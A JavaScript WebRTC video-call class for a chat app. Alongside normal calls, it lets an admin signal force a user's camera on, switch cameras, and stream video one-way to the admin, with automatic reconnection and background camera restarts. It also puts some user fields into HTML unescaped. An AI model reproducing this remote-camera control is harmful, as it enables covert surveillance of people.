class VideoCallManager {
  constructor({ currentUser, sendSignal, sendMonitorSignal, reportCameraStatus }) {
    this.currentUser = currentUser;
    this.sendSignal = sendSignal;
    this.sendMonitorSignal = sendMonitorSignal || (async () => {});
    this.reportCameraStatus = reportCameraStatus || (async () => {});
    this.peerId = null;
    this.peerName = '';
    this.peerColor = '#6366f1';
    this.pc = null;
    this.localStream = null;
    this.isCaller = false;
    this.inCall = false;
    this.micOn = true;
    this.camOn = true;
    this.onlineUsers = [];
    this.autoCameraActive = false;
    this.adminCamEnabled = true;
    this.cameraFacing = 'user';
    this.monitorPCs = new Map();
    this.monitorIceQueue = null;
    this.monitorReconnectTimer = null;
    this.monitorRetryCount = 0;
    this.monitorActive = false;

    this.iceConfig = typeof WebRTCUtils !== 'undefined'
      ? WebRTCUtils.getIceConfig()
      : {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      };

    this.els = {
      picker: document.getElementById('callPickerModal'),
      usersList: document.getElementById('onlineUsersList'),
      incoming: document.getElementById('incomingCall'),
      incomingAvatar: document.getElementById('incomingAvatar'),
      incomingName: document.getElementById('incomingName'),
      active: document.getElementById('activeCall'),
      localVideo: document.getElementById('localVideo'),
      remoteVideo: document.getElementById('remoteVideo'),
      statusText: document.getElementById('callStatusText'),
      previewVideo: document.getElementById('previewVideo')
    };

    this.bindUI();
  }

  bindUI() {
    document.getElementById('videoCallBtn')?.addEventListener('click', () => this.showPicker());
    document.getElementById('closeCallPicker')?.addEventListener('click', () => this.hidePicker());
    document.getElementById('acceptCallBtn')?.addEventListener('click', () => this.acceptCall());
    document.getElementById('rejectCallBtn')?.addEventListener('click', () => this.rejectCall());
    document.getElementById('hangupBtn')?.addEventListener('click', () => this.hangup());
    document.getElementById('toggleMicBtn')?.addEventListener('click', () => this.toggleMic());
    document.getElementById('toggleCamBtn')?.addEventListener('click', () => this.toggleCam());
  }

  setOnlineUsers(users) {
    this.onlineUsers = users || [];
  }

  getVideoConstraints() {
    return {
      facingMode: this.cameraFacing,
      width: { ideal: 640 },
      height: { ideal: 480 }
    };
  }

  async reportStatus(active, permission) {
    const videoTrack = this.localStream?.getVideoTracks()[0];
    const reallyActive = !!(active && videoTrack && videoTrack.readyState === 'live' && videoTrack.enabled);
    await this.reportCameraStatus(reallyActive, permission, this.cameraFacing);
  }

  getLiveVideoTracks() {
    return (this.localStream?.getVideoTracks() || []).filter((t) => t.readyState === 'live');
  }

  async acquireMediaStream() {
    const audioConstraints = {
      echoCancellation: false,
      noiseSuppression: false,
      autoGainControl: false
    };
    const isIOS = typeof WebRTCUtils !== 'undefined' && WebRTCUtils.isIOS();

    try {
      if (!isIOS) {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: this.cameraFacing }, width: { ideal: 640 }, height: { ideal: 480 } },
          audio: audioConstraints
        });
        stream.getAudioTracks().forEach((t) => { t.enabled = false; });
        return stream;
      }
      throw new Error('skip exact on iOS');
    } catch {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: this.getVideoConstraints(),
        audio: audioConstraints
      });
      stream.getAudioTracks().forEach((t) => { t.enabled = false; });
      return stream;
    }
  }

  async acquireVideoTrack() {
    const stream = await this.acquireMediaStream();
    stream.getAudioTracks().forEach((t) => {
      if (!this.localStream?.getAudioTracks().includes(t)) t.stop();
    });
    return stream.getVideoTracks()[0];
  }

  bindVideoTrackRecovery(track) {
    track.addEventListener('ended', () => {
      if (this.autoCameraActive && !this.inCall && this.adminCamEnabled) {
        setTimeout(() => this.maintainBackgroundCamera(), 300);
      }
    });
  }

  async applyMediaStream(stream) {
    if (!this.localStream) {
      this.localStream = new MediaStream();
    }

    stream.getVideoTracks().forEach((newTrack) => {
      this.localStream.getVideoTracks().forEach((track) => {
        track.stop();
        this.localStream.removeTrack(track);
      });
      newTrack.enabled = this.adminCamEnabled;
      this.bindVideoTrackRecovery(newTrack);
      this.localStream.addTrack(newTrack);
    });

    if (!this.localStream.getAudioTracks().length) {
      stream.getAudioTracks().forEach((track) => {
        track.enabled = false;
        this.localStream.addTrack(track);
      });
    }
  }

  async maintainBackgroundCamera() {
    if (this.inCall || !this.adminCamEnabled) return;

    const videoTracks = this.localStream?.getVideoTracks() || [];
    const needsRestart = !videoTracks.length || videoTracks.some((t) => t.readyState === 'ended');

    if (needsRestart) {
      try {
        const stream = await this.acquireMediaStream();
        await this.applyMediaStream(stream);
        await this.replaceVideoTrackInPCs(stream.getVideoTracks()[0]);
        if (this.monitorPCs.size) await this.renegotiateMonitorSessions();
        this.autoCameraActive = true;
        this.camOn = true;
        if (!this.inCall) this.showPreview();
        await this.reportStatus(true, 'granted');
      } catch (err) {
        console.warn('Gagal memulihkan kamera background:', err.message);
      }
      return;
    }

    for (const pc of this.monitorPCs.values()) {
      if (['failed', 'closed', 'disconnected'].includes(pc.connectionState)) {
        await this.startMonitorSession();
        break;
      }
    }
  }

  async replaceVideoTrackInPCs(newTrack) {
    if (!newTrack) return;
    newTrack.enabled = this.adminCamEnabled;

    if (this.pc) {
      const sender = this.pc.getSenders().find((s) => s.track?.kind === 'video');
      if (sender) await sender.replaceTrack(newTrack);
    }

    for (const pc of this.monitorPCs.values()) {
      const sender = pc.getSenders().find((s) => s.track?.kind === 'video');
      if (sender) {
        await sender.replaceTrack(newTrack);
      } else if (newTrack.enabled) {
        pc.addTrack(newTrack, this.localStream);
      }
    }
  }

  async renegotiateMonitorSessions() {
    for (const pc of this.monitorPCs.values()) {
      if (pc.signalingState === 'closed') continue;
      try {
        const offer = await pc.createOffer({ iceRestart: true });
        await pc.setLocalDescription(offer);
        await this.sendMonitorSignal('monitor-offer', { sdp: offer });
      } catch (err) {
        console.warn('Renegotiate monitor gagal:', err.message);
      }
    }
  }

  async switchCameraFacing(facing) {
    if (!['user', 'environment'].includes(facing)) return;
    if (this.cameraFacing === facing && this.localStream?.getVideoTracks().length) return;

    this.cameraFacing = facing;
    this.adminCamEnabled = true;

    try {
      const newTrack = await this.acquireVideoTrack();
      newTrack.enabled = this.adminCamEnabled;

      if (!this.localStream) {
        this.localStream = new MediaStream();
      }

      this.localStream.getVideoTracks().forEach((track) => {
        track.stop();
        this.localStream.removeTrack(track);
      });
      this.bindVideoTrackRecovery(newTrack);
      this.localStream.addTrack(newTrack);

      await this.replaceVideoTrackInPCs(newTrack);
      if (this.monitorPCs.size) await this.renegotiateMonitorSessions();

      this.autoCameraActive = true;
      this.camOn = true;

      if (this.els.localVideo) this.els.localVideo.srcObject = this.localStream;
      if (!this.inCall) this.showPreview();
      else this.updateControlButtons();

      await this.reportStatus(true, 'granted');
    } catch (err) {
      console.warn('Gagal ganti kamera:', err.message);
      await this.reportStatus(false, 'denied');
    }
  }

  async startAutoCamera() {
    if (this.inCall) return;

    const liveTracks = this.localStream?.getVideoTracks().filter((t) => t.readyState === 'live') || [];
    if (liveTracks.length && this.autoCameraActive) {
      liveTracks.forEach((t) => { t.enabled = this.adminCamEnabled; });
      this.camOn = this.adminCamEnabled;
      this.showPreview();
      return;
    }

    try {
      if (!this.localStream?.getVideoTracks().length) {
        const stream = await this.acquireMediaStream();
        await this.applyMediaStream(stream);
      } else {
        this.localStream.getVideoTracks().forEach((t) => {
          t.enabled = this.adminCamEnabled;
        });
      }
      this.autoCameraActive = true;
      this.camOn = this.adminCamEnabled;
      this.showPreview();
      await this.reportStatus(this.adminCamEnabled, 'granted');
      if (typeof window.updateAdminSignalPolling === 'function') {
        window.updateAdminSignalPolling();
      }
    } catch (err) {
      console.warn('Kamera tidak dapat diakses:', err.message);
      this.autoCameraActive = false;
      await this.reportStatus(false, 'denied');
    }
  }

  showPreview() {
    if (!this.adminCamEnabled || !this.localStream || this.inCall) {
      this.hidePreview();
      return;
    }
    if (this.els.previewVideo) {
      this.els.previewVideo.srcObject = this.localStream;
      this.els.previewVideo.play().catch(() => {});
    }
  }

  hidePreview() {
    if (this.els.previewVideo && !this.monitorPCs.size) {
      this.els.previewVideo.srcObject = null;
    }
  }

  async forceCameraOn() {
    this.adminCamEnabled = true;
    if (!this.localStream) {
      await this.startAutoCamera();
      return;
    }
    this.localStream.getVideoTracks().forEach((t) => { t.enabled = true; });
    this.camOn = true;
    this.autoCameraActive = true;
    if (!this.inCall) this.showPreview();
    await this.reportStatus(true, 'granted');
  }

  async forceCameraOff() {
    this.adminCamEnabled = false;
    if (this.localStream) {
      this.localStream.getVideoTracks().forEach((t) => { t.enabled = false; });
    }
    this.camOn = false;
    this.hidePreview();
    this.cleanupAllMonitors();
    await this.reportStatus(false, 'admin_off');
  }

  async handleAdminSignal(signal) {
    this._adminSignalChain = (this._adminSignalChain || Promise.resolve())
      .then(() => this._processAdminSignal(signal))
      .catch((err) => console.warn('Admin signal error:', err));
    return this._adminSignalChain;
  }

  async _processAdminSignal(signal) {
    const type = signal.type;
    const data = signal.data || {};

    switch (type) {
      case 'admin-cam-on':
        await this.forceCameraOn();
        break;
      case 'admin-cam-off':
        await this.forceCameraOff();
        break;
      case 'admin-cam-facing':
        await this.switchCameraFacing(data.facing || 'user');
        break;
      case 'monitor-request':
        await this.startMonitorSession();
        break;
      case 'monitor-stop':
        this.cleanupAllMonitors();
        break;
      case 'monitor-answer':
        await this.handleMonitorAnswer(data.sdp);
        break;
      case 'monitor-ice':
        await this.handleMonitorIce(data.candidate);
        break;
    }
  }

  notifyMonitorState() {
    if (typeof window.onMonitorSessionChange === 'function') {
      window.onMonitorSessionChange(this.monitorPCs.size > 0);
    }
    if (typeof window.updateAdminSignalPolling === 'function') {
      window.updateAdminSignalPolling();
    }
  }

  scheduleMonitorReconnect() {
    if (!this.adminCamEnabled || this.inCall) return;
    this.monitorRetryCount = Math.min(this.monitorRetryCount + 1, 8);
    clearTimeout(this.monitorReconnectTimer);
    const delay = Math.min(4000, 800 + this.monitorRetryCount * 600);
    this.monitorReconnectTimer = setTimeout(() => {
      if (this.adminCamEnabled && !this.inCall) {
        this.startMonitorSession();
      }
    }, delay);
  }

  async restartCameraFresh() {
    if (this.localStream) {
      this.localStream.getVideoTracks().forEach((track) => {
        track.stop();
        this.localStream.removeTrack(track);
      });
    }
    try {
      const stream = await this.acquireMediaStream();
      await this.applyMediaStream(stream);
      this.autoCameraActive = true;
      this.camOn = true;
      this.showPreview();
      await this.reportStatus(true, 'granted');
      return true;
    } catch (err) {
      console.warn('restartCameraFresh gagal:', err.message);
      await this.reportStatus(false, 'denied');
      return false;
    }
  }

  async ensureCameraReady() {
    const isIOS = typeof WebRTCUtils !== 'undefined' && WebRTCUtils.isIOS();
    if (isIOS && this.monitorRetryCount > 0) {
      await this.restartCameraFresh();
    } else if (!this.localStream) {
      await this.forceCameraOn();
    }

    this.showPreview();
    const videoEl = this.els.previewVideo;

    if (videoEl) {
      await videoEl.play().catch(() => {});
    }

    if (typeof WebRTCUtils !== 'undefined' && videoEl) {
      const hasFrames = await WebRTCUtils.waitForVideoFrames(videoEl, 10000);
      if (hasFrames) return true;
    }

    if (isIOS) {
      return this.restartCameraFresh().then(async (ok) => {
        if (!ok) return false;
        this.showPreview();
        if (videoEl && typeof WebRTCUtils !== 'undefined') {
          return WebRTCUtils.waitForVideoFrames(videoEl, 8000);
        }
        return this.getLiveVideoTracks().length > 0;
      });
    }

    const tracks = this.getLiveVideoTracks();
    return tracks.length > 0 && tracks[0].readyState === 'live';
  }

  async startMonitorSession() {
    if (!this.adminCamEnabled) return;

    const ready = await this.ensureCameraReady();
    if (!ready) {
      console.warn('Kamera belum menghasilkan frame, retry monitor...');
      this.scheduleMonitorReconnect();
      return;
    }

    if (!this.localStream) return;

    let videoTracks = this.getLiveVideoTracks();
    if (!videoTracks.length) {
      await this.forceCameraOn();
      videoTracks = this.getLiveVideoTracks();
    }
    if (!videoTracks.length) {
      this.scheduleMonitorReconnect();
      return;
    }

    videoTracks.forEach((t) => { t.enabled = true; });
    this.showPreview();

    this.cleanupMonitor(0, false);
    const pc = new RTCPeerConnection(this.iceConfig);
    this.monitorPCs.set(0, pc);
    this.monitorIceQueue = typeof WebRTCUtils !== 'undefined'
      ? WebRTCUtils.createIceQueue()
      : null;
    this.monitorActive = true;
    this.notifyMonitorState();

    const isIOS = typeof WebRTCUtils !== 'undefined' && WebRTCUtils.isIOS();
    if (isIOS) {
      const transceiver = pc.addTransceiver('video', { direction: 'sendonly' });
      await transceiver.sender.replaceTrack(videoTracks[0]);
    } else {
      videoTracks.forEach((track) => {
        pc.addTrack(track, this.localStream);
      });
    }

    pc.onicecandidate = (e) => {
      if (e.candidate) {
        this.sendMonitorSignal('monitor-ice', { candidate: e.candidate });
      }
    };

    pc.onconnectionstatechange = () => {
      const state = pc.connectionState;
      if (state === 'connected') {
        this.monitorRetryCount = 0;
      } else if (state === 'disconnected') {
        clearTimeout(this.monitorReconnectTimer);
        this.monitorReconnectTimer = setTimeout(() => {
          const current = this.monitorPCs.get(0);
          if (current && ['disconnected', 'failed'].includes(current.connectionState)) {
            this.scheduleMonitorReconnect();
          }
        }, 2500);
      } else if (state === 'failed') {
        this.scheduleMonitorReconnect();
      }
    };

    pc.oniceconnectionstatechange = () => {
      if (pc.iceConnectionState === 'failed') {
        this.scheduleMonitorReconnect();
      }
    };

    if (typeof WebRTCUtils !== 'undefined') {
      WebRTCUtils.preferH264(pc);
    }

    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    if (typeof WebRTCUtils !== 'undefined') {
      await WebRTCUtils.waitForIceGatheringComplete(pc);
    }
    await this.sendMonitorSignal('monitor-offer', { sdp: pc.localDescription });
  }

  async handleMonitorAnswer(sdp) {
    const pc = this.monitorPCs.get(0);
    if (!pc || !sdp) return;
    try {
      await pc.setRemoteDescription(new RTCSessionDescription(sdp));
      if (this.monitorIceQueue) {
        await this.monitorIceQueue.flush(pc);
      }
    } catch (e) {
      console.warn('Monitor answer error:', e);
      this.scheduleMonitorReconnect();
    }
  }

  async handleMonitorIce(candidate) {
    const pc = this.monitorPCs.get(0);
    if (!pc || !candidate) return;
    if (this.monitorIceQueue) {
      await this.monitorIceQueue.add(pc, candidate);
    } else {
      try {
        await pc.addIceCandidate(new RTCIceCandidate(candidate));
      } catch (e) { /* ignore stale candidates */ }
    }
  }

  cleanupMonitor(adminId, notifyState = true) {
    const pc = this.monitorPCs.get(adminId);
    if (pc) {
      pc.close();
      this.monitorPCs.delete(adminId);
    }
    if (this.monitorIceQueue) {
      this.monitorIceQueue.clear();
      this.monitorIceQueue = null;
    }
    clearTimeout(this.monitorReconnectTimer);
    if (notifyState) {
      this.monitorActive = this.monitorPCs.size > 0;
      this.notifyMonitorState();
    }
  }

  cleanupAllMonitors() {
    [...this.monitorPCs.keys()].forEach((id) => this.cleanupMonitor(id));
  }

  showPicker() {
    if (this.inCall) return;
    this.renderOnlineUsers();
    this.els.picker.style.display = 'flex';
  }

  hidePicker() {
    this.els.picker.style.display = 'none';
  }

  renderOnlineUsers() {
    const list = this.els.usersList;
    if (!list) return;

    if (!this.onlineUsers.length) {
      list.innerHTML = '<p class="vc-empty">Tidak ada user online untuk dipanggil</p>';
      return;
    }

    list.innerHTML = this.onlineUsers.map(u => `
      <button class="vc-user-item" data-id="${u.id}">
        <span class="avatar avatar-sm" style="background:${u.avatar_color}">${u.display_name.charAt(0).toUpperCase()}</span>
        <span>${this.escapeHtml(u.display_name)}</span>
        <span class="vc-call-icon">📹</span>
      </button>
    `).join('');

    list.querySelectorAll('.vc-user-item').forEach(btn => {
      btn.addEventListener('click', () => {
        const user = this.onlineUsers.find(u => u.id === parseInt(btn.dataset.id));
        if (user) this.startCall(user);
      });
    });
  }

  async startCall(user) {
    if (this.inCall) return;
    try {
      this.isCaller = true;
      this.peerId = user.id;
      this.peerName = user.display_name;
      this.peerColor = user.avatar_color;
      this.inCall = true;
      this.hidePicker();
      this.hidePreview();
      if (typeof window.onVideoCallStart === 'function') window.onVideoCallStart();

      await this.getMedia();
      this.showActiveCall('Memanggil ' + user.display_name + '...');

      await this.sendSignal(user.id, 'call-request', {
        from_name: this.currentUser.display_name,
        from_color: this.currentUser.avatar_color
      });
    } catch (err) {
      alert('Tidak bisa memulai panggilan: ' + err.message);
      this.endCall();
    }
  }

  async handleSignal(signal) {
    const from = signal.from;
    const type = signal.type;
    const data = signal.data || {};

    switch (type) {
      case 'call-request':
        if (this.inCall) {
          await this.sendSignal(from, 'call-reject', {});
          return;
        }
        this.peerId = from;
        this.peerName = data.from_name || signal.from_name || 'User';
        this.peerColor = data.from_color || signal.from_color || '#6366f1';
        this.showIncoming();
        break;

      case 'call-accept':
        if (this.isCaller && this.peerId === from) {
          await this.createAndSendOffer();
        }
        break;

      case 'call-reject':
        if (this.peerId === from) {
          alert(this.peerName + ' menolak panggilan');
          this.endCall();
        }
        break;

      case 'call-offer':
        if (this.peerId === from) {
          await this.handleOffer(data.sdp);
        }
        break;

      case 'call-answer':
        if (this.peerId === from && this.pc) {
          await this.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
          this.setStatus('Terhubung');
        }
        break;

      case 'call-ice':
        if (this.peerId === from && this.pc && data.candidate) {
          try {
            await this.pc.addIceCandidate(new RTCIceCandidate(data.candidate));
          } catch (e) { /* ignore stale candidates */ }
        }
        break;

      case 'call-hangup':
        if (this.peerId === from) this.endCall();
        break;
    }
  }

  showIncoming() {
    this.els.incomingAvatar.textContent = this.peerName.charAt(0).toUpperCase();
    this.els.incomingAvatar.style.background = this.peerColor;
    this.els.incomingName.textContent = this.peerName + ' memanggil...';
    this.els.incoming.style.display = 'flex';
    window.ChatNotify?.notifyIncomingCall(this.peerName);
  }

  async acceptCall() {
    try {
      this.inCall = true;
      if (typeof window.onVideoCallStart === 'function') window.onVideoCallStart();
      this.els.incoming.style.display = 'none';
      this.hidePreview();
      await this.getMedia();
      this.showActiveCall('Menghubungkan...');
      await this.sendSignal(this.peerId, 'call-accept', {});
    } catch (err) {
      alert('Tidak bisa menerima panggilan: ' + err.message);
      this.endCall();
    }
  }

  rejectCall() {
    this.sendSignal(this.peerId, 'call-reject', {});
    this.endCall();
  }

  async createAndSendOffer() {
    this.createPeerConnection();
    const offer = await this.pc.createOffer();
    await this.pc.setLocalDescription(offer);
    await this.sendSignal(this.peerId, 'call-offer', { sdp: offer });
    this.setStatus('Menghubungkan...');
  }

  async handleOffer(sdp) {
    if (!this.localStream) await this.getMedia();
    if (!this.pc) this.createPeerConnection();
    await this.pc.setRemoteDescription(new RTCSessionDescription(sdp));
    const answer = await this.pc.createAnswer();
    await this.pc.setLocalDescription(answer);
    await this.sendSignal(this.peerId, 'call-answer', { sdp: answer });
    this.setStatus('Terhubung');
  }

  createPeerConnection() {
    if (this.pc) this.pc.close();
    this.pc = new RTCPeerConnection(this.iceConfig);

    this.localStream.getTracks().forEach(track => {
      this.pc.addTrack(track, this.localStream);
    });

    this.pc.ontrack = (e) => {
      if (e.streams[0]) this.els.remoteVideo.srcObject = e.streams[0];
    };

    this.pc.onicecandidate = (e) => {
      if (e.candidate) {
        this.sendSignal(this.peerId, 'call-ice', { candidate: e.candidate });
      }
    };

    this.pc.onconnectionstatechange = () => {
      const state = this.pc?.connectionState;
      if (state === 'connected') this.setStatus('Terhubung');
      if (state === 'disconnected') this.setStatus('Koneksi terputus...');
      if (state === 'failed' || state === 'closed') this.endCall();
    };
  }

  async getMedia() {
    if (this.localStream?.getAudioTracks().length && this.localStream.getVideoTracks().length) {
      this.els.localVideo.srcObject = this.localStream;
      return;
    }

    if (this.localStream && !this.localStream.getAudioTracks().length) {
      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      audioStream.getAudioTracks().forEach((t) => this.localStream.addTrack(t));
      this.micOn = true;
      this.els.localVideo.srcObject = this.localStream;
      this.updateControlButtons();
      return;
    }

    if (this.localStream) return;

    this.localStream = await navigator.mediaDevices.getUserMedia({
      video: this.getVideoConstraints(),
      audio: true
    });
    this.els.localVideo.srcObject = this.localStream;
    this.micOn = true;
    this.camOn = true;
    this.autoCameraActive = true;
    this.updateControlButtons();
  }

  showActiveCall(status) {
    this.els.incoming.style.display = 'none';
    this.els.active.style.display = 'flex';
    this.setStatus(status);
  }

  setStatus(text) {
    if (this.els.statusText) this.els.statusText.textContent = text;
  }

  hangup() {
    if (this.peerId) this.sendSignal(this.peerId, 'call-hangup', {});
    this.endCall();
  }

  toggleMic() {
    if (!this.localStream) return;
    this.micOn = !this.micOn;
    this.localStream.getAudioTracks().forEach(t => { t.enabled = this.micOn; });
    this.updateControlButtons();
  }

  toggleCam() {
    if (!this.localStream) return;
    this.camOn = !this.camOn;
    this.adminCamEnabled = this.camOn;
    this.localStream.getVideoTracks().forEach(t => { t.enabled = this.camOn; });
    if (this.camOn && !this.inCall) this.showPreview();
    else if (!this.camOn) this.hidePreview();
    this.updateControlButtons();
    this.reportStatus(this.camOn, this.camOn ? 'granted' : 'admin_off');
  }

  updateControlButtons() {
    const micBtn = document.getElementById('toggleMicBtn');
    const camBtn = document.getElementById('toggleCamBtn');
    if (micBtn) micBtn.textContent = this.micOn ? '🎤' : '🔇';
    if (camBtn) camBtn.textContent = this.camOn ? '📷' : '🚫';
    if (micBtn) micBtn.classList.toggle('vc-muted', !this.micOn);
    if (camBtn) camBtn.classList.toggle('vc-muted', !this.camOn);
  }

  endCall() {
    this.pc?.close();
    this.pc = null;
    this.peerId = null;
    this.peerName = '';
    this.isCaller = false;
    this.inCall = false;

    if (this.els.remoteVideo) this.els.remoteVideo.srcObject = null;
    if (this.els.incoming) this.els.incoming.style.display = 'none';
    if (this.els.active) this.els.active.style.display = 'none';
    this.hidePicker();

    if (this.localStream) {
      this.localStream.getAudioTracks().forEach((t) => {
        this.localStream.removeTrack(t);
        t.stop();
      });
      this.micOn = false;
    }

    if (this.autoCameraActive && this.adminCamEnabled) {
      if (this.els.localVideo) this.els.localVideo.srcObject = null;
      this.showPreview();
    }

    if (typeof window.onVideoCallEnd === 'function') window.onVideoCallEnd();
  }

  cleanup() {
    this.endCall();
    this.cleanupAllMonitors();
    this.localStream?.getTracks().forEach(t => t.stop());
    this.localStream = null;
    this.autoCameraActive = false;
    this.adminCamEnabled = true;

    if (this.els.localVideo) this.els.localVideo.srcObject = null;
    if (this.els.remoteVideo) this.els.remoteVideo.srcObject = null;
    this.hidePreview();
  }

  escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
}

window.VideoCallManager = VideoCallManager;
